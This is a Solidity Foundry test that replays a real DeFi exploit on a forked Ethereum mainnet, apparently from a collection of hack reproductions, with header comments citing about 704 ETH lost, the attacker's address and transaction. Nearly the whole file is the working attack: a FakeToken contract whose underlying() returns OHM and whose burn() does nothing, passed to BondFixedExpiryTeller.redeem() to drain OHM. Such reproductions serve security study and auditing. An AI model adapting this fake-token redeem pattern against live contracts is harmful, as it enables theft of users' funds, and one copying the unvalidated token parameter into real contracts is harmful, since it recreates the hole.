// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)
// Attacker : 0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be
// AttackContract : 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f
// Tx1 attack redeem:  https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf

// @NewsTrack
// PeckShield : https://twitter.com/peckshield/status/1583416829237526528

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
address constant BondFixedExpiryTeller = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;

interface IBondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external;
}

contract FakeToken {
    function underlying() external view returns (address) {
        return OHM;
    }

    function expiry() external pure returns (uint48 _expiry) {
        return 1;
    }

    function burn(address, uint256) external {
        // no thing
    }
}

contract AttackContract is Test {
    function setUp() public {
        cheat.createSelectFork("mainnet", 15_794_363);
        cheat.label(OHM, "OHM");
        cheat.label(BondFixedExpiryTeller, "BondFixedExpiryTeller");
    }

    function testExploit() public {
        console.log("---------- Start from Block %s ----------", block.number);
        emit log_named_decimal_uint("Attacker OHM Balance", IERC20(OHM).balanceOf(address(this)), 9);

        address fakeToken = address(new FakeToken());
        cheat.label(fakeToken, "FakeToken");
        // console.log("Deploy fake token on ", fakeToken);

        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, 30_437_077_948_152);
        console.log("Redeeming");
        emit log_named_decimal_uint("Attacker OHM Balance after hack", IERC20(OHM).balanceOf(address(this)), 9);
    }
}
